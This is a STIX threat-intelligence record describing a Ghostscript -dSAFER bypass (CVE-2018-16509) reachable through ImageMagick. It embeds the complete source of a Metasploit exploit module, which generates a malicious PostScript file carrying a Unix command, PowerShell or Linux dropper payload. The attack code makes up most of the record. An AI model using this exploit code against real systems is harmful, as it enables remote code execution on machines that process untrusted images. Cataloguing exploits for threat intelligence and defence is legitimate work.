{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--80b260b9-e637-43f5-b148-dad5f600e189",
    "created": "2024-08-14T17:05:01.780534Z",
    "modified": "2024-08-14T17:05:01.780538Z",
    "name": "Ghostscript Failed Restore Command Execution",
    "description": " This module exploits a -dSAFER bypass in Ghostscript to execute arbitrary commands by handling a failed restore (grestore) in PostScript to disable LockSafetyParams and avoid invalidaccess.  This vulnerability is reachable via libraries such as ImageMagick. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/ghostscript_failed_restore.rb",
            "external_id": "ghostscript_failed_restore.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-16509"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2018/q3/142"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1640"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n\n  Rank = ExcellentRanking\n\n  PLACEHOLDER_STRING  = 'metasploit'\n  PLACEHOLDER_COMMAND = 'echo vulnerable > /dev/tty'\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'              => 'Ghostscript Failed Restore Command Execution',\n      'Description'       => %q{\n        This module exploits a -dSAFER bypass in Ghostscript to execute\n        arbitrary commands by handling a failed restore (grestore) in\n        PostScript to disable LockSafetyParams and avoid invalidaccess.\n\n        This vulnerability is reachable via libraries such as ImageMagick.\n      },\n      'Author'            => [\n        'Tavis Ormandy', # Vuln discovery and exploit\n        'wvu'            # Metasploit module\n      ],\n      'References'        => [\n        ['CVE', '2018-16509'],\n        ['URL', 'https://seclists.org/oss-sec/2018/q3/142'],\n        ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1640']\n      ],\n      'DisclosureDate'    => '2018-08-21',\n      'License'           => MSF_LICENSE,\n      'Platform'          => ['unix', 'linux', 'win'],\n      'Arch'              => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Privileged'        => false,\n      'Targets'           => [\n        ['Unix (In-Memory)',\n          'Platform'      => 'unix',\n          'Arch'          => ARCH_CMD,\n          'Type'          => :unix_memory,\n          'Payload'       => {\n            'Space'       => 4089, # 4096 total\n            'DisableNops' => true\n          }\n        ],\n        ['PowerShell (In-Memory)',\n          'Platform'      => 'win',\n          'Arch'          => [ARCH_X86, ARCH_X64],\n          'Type'          => :psh_memory\n        ],\n        ['Linux (Dropper)',\n          'Platform'      => 'linux',\n          'Arch'          => [ARCH_X86, ARCH_X64],\n          'Type'          => :linux_dropper\n        ]\n      ],\n      'DefaultTarget'     => 0,\n      'Notes'             => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'RelatedModules'  => [\n          'exploit/unix/fileformat/ghostscript_type_confusion',\n          'exploit/unix/fileformat/imagemagick_delegate'\n        ]\n      }\n    ))\n\n    register_options([\n      OptString.new('FILENAME', [true, 'Output file', 'msf.ps'])\n    ])\n\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable dir for droppers', '/tmp'])\n    ])\n  end\n\n  def exploit\n    sploit = template\n\n    # Replace our placeholder string with a random one\n    sploit.sub!(PLACEHOLDER_STRING, Rex::Text.rand_text_alphanumeric(8..42))\n\n    # Replace our test payload with the real one\n    case target['Type']\n    when :unix_memory\n      sploit.sub!(PLACEHOLDER_COMMAND, payload.encoded)\n    when :psh_memory\n      psh = cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      )\n\n      # XXX: Payload space applies to the payload, not the PSH command\n      if psh.length > targets[0].payload_space\n        fail_with(Failure::BadConfig, 'Please choose a smaller payload')\n      end\n\n      sploit.sub!(PLACEHOLDER_COMMAND, psh)\n    when :linux_dropper\n      cmdstager = generate_cmdstager(\n        linemax: targets[0].payload_space,\n        temp:    datastore['WritableDir']\n      ).join(';')\n\n      # XXX: Payload space applies to the payload, not the command stager\n      if cmdstager.length > targets[0].payload_space\n        fail_with(Failure::BadConfig, 'Please choose a smaller command stager')\n      end\n\n      sploit.sub!(PLACEHOLDER_COMMAND, cmdstager)\n    end\n\n    file_create(sploit)\n  end\n\n  def template\n    File.read(File.join(\n      Msf::Config.data_directory, 'exploits', 'ghostscript', 'msf.ps'\n    ))\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-08-21",
    "x_mitre_platforms": [
        "linux'"
    ]
}